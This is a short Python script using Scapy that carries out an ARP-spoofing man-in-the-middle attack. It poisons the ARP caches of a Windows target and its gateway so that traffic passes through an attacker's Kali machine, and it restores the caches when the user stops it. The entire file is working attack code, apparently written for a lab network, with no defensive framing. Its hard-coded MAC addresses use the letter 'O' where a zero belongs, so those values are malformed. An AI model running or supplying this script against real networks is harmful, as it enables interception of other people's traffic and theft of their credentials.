from scapy.all import *
import time

# Network details (replace if needed)
target_ip = "10.15.117.1"    # Windows target
gateway_ip = "10.15.0.1"      # Gateway

# MAC addresses (from your input)
target_mac = "OA:E1:B8:Cf:7D:4B"  # Windows target MAC
gateway_mac = "OA:72:BA:OF:5D:5C" # Gateway MAC
kali_mac = get_if_hwaddr(conf.iface)  # Kali's MAC (auto-detected)

def spoof():
    while True:
        # Poison target: "Gateway's MAC is Kali's MAC"
        sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, hwsrc=kali_mac), verbose=0)
        
        # Poison gateway: "Target's MAC is Kali's MAC"
        sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, hwsrc=kali_mac), verbose=0)
        
        time.sleep(1)  # Faster spoofing (adjust as needed)

try:
    print("[+] Starting MITM attack. Press Ctrl+C to stop.")
    spoof()
except KeyboardInterrupt:
    print("\n[!] Restoring ARP tables...")
    # Restore target's ARP cache
    sendp(Ether(dst=target_mac)/ARP(op=2, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, hwsrc=gateway_mac), count=5, verbose=0)
    # Restore gateway's ARP cache
    sendp(Ether(dst=gateway_mac)/ARP(op=2, psrc=target_ip, hwdst=gateway_mac, pdst=gateway_ip, hwsrc=target_mac), count=5, verbose=0)
    print("[+] ARP tables restored. MITM stopped.")
